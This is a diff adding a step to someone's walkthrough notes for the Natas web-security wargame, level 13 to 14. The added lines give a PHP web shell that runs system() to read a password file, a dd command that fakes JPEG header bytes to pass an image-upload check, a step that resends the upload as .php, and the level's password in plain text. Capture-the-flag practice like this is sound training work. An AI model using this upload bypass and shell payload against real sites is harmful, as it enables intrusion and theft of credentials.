@@ -161,6 +161,23 @@ level>>12-13 : > open the url in the browser.
 
 level>>13-14 :  > open the url in the browser.
                 > enter the username and pass.
+                > create a php file,
+                      <?php echo system('cat /etc/natas_webpass/natas14'); ?>
+                > change the bytes of the previous file so that it will pass the image verification.
+                > run this command in order to change the bytes of the file.
+                > echo -ne '\xFF\xD8\xFF\xE0' | dd conv=notrunc bs=1 count=4 of=filename   
+                    ( " -n " prevents from a new line at the end of echo and " e " will enable the escape of sequence )
+                    ( " dd " is copy tool of bytes , " conv=notrunc" will just only make sure to replace how many bytes which had given as count ,"bs=1" is block size is 1byte ,"of=target file"
+                > upload the file.
+                > inspect and resend it by changing jpg to php.
+                > get the password.
+
+                    Password: z3UYcr4v4uBpeX8f7EZbMHlzK4UR2XtQ
+
+level>>14-15 :  > open the url in the browser.
+                > enter the username and pass.
+
+
 
 
                 
